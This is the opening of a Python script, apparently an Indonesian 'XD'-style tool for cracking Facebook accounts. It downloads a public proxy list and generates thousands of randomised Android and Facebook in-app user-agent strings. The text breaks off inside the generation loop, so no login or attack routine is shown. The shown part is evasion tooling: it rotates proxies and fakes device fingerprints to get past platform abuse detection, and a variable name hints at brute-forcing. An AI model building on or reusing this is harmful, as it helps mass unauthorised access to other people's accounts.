#--- CODED BY MOHAMMAD FIKRAM XD ---#
#-----------------[ IMPORT-MODULE ]-------------------#
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as parse
from bs4 import BeautifulSoup as par
from concurrent.futures import ThreadPoolExecutor as tred
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from rich.console import Group as gp
from rich.panel import Panel as Panel
from rich.panel import Panel as nel
from rich import print as cetak
from concurrent.futures import ThreadPoolExecutor as Fikram_XD
from rich.panel import Panel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich.tree import Tree
from rich import print as rprint
from rich import print as prints
from rich import pretty
from rich.text import Text as tekz
from time import time as CikKawan
try:
        import bs4
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul bs4 •'))
        os.system('pip install bs4')
try:
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
	os.system('pip install requests && pip install mechanize ')

###---------[ WARNA PRINTS RICH ]---------###
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
U2 = "[#AF00FF]" # UNGU
O2 = "[#FF8F00]" # ORANGE

###--------[ SETTING USER-AGENT ]--------###
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
from rich.console import Console
from rich.columns import Columns
wa = Console()
console = Console()
try:
	prox= requests.get('https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/prox.txt').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mFikram_XD')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000) :
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='XT1068 Build/LXB22.46-28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e='Mobile Safari/537.36'
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e='Mobile Safari/537.36'
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mozilla/5.0 (Linux; Android 11; LUNA G9 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; LUNA G50 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; LUNA G60 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; LUNA V55) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; LUNA G9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto G (5) Plus Build/NPNS25.137-35-5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto E (4) Plus Build/NMA26.42-56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto E (4) Plus Build/NMA26.42-56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto G (5S) Plus Build/NPS26.116-51) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='XT1068 Build/LXB22.46-28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='moto e5 Build/OPPS27.91-176-11-16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(6, 14) 
	c='SM-A105'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=str(random.randrange(10, 214))+'.0.'+str(random.randrange(3000, 7000))+'.'+str(random.randrange(10, 275)) 
	f=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	geko=f'{a} {b}; {c}) {d}{e} {f}'
	ugen2.append(geko) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto G Play Build/NPIS26.48-43-2) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam)  
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='M2006C3MNG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam)  
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='SM-A032F Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam)  
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='-F936B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam)  
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='SM-G6100 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam)  	
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='zh-cn; GT-S7562C Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam)  	
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='SM-A710F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam)  	

	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='SM-G316MY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam)  	

	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='SM-G355H Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam)  	
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='RMX'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='Mobile Safari/537.36'
	uga=f'{a} {b}; {c}{d}) {e}{f} {g}'
	ugen.append(uga) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='CPH'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='Mobile Safari/537.36'
	uga=f'{a} {b}; {c}{d}) {e}{f} {g}'
	ugen.append(uga) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='vivo'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='Mobile Safari/537.36'
	uga=f'{a} {b}; {c} {d}) {e}{f} {g}'
	ugen.append(uga) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='Infinix X6810 Build/RP1A.200720.011; wv)'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/412.0.0.22.115;]'
	uga=f'{a} {b}; {c} {d}) {e}{f} {g}'
	ugen.append(uga) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='ASUS_A009 Build/OPM1.171019.011; wv)'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/315.0.0.47.113;]'
	uga=f'{a} {b}; {c} {d}) {e}{f} {g}'
	ugen.append(uga) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='Infinix X669D Build/SP1A.210812.016; wv)'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/406.0.0.13.115;]'
	uga=f'{a} {b}; {c} {d}) {e}{f} {g}'
	ugen.append(uga) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='en-US; Infinix X6815C Build/SP1A.210812.016)'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
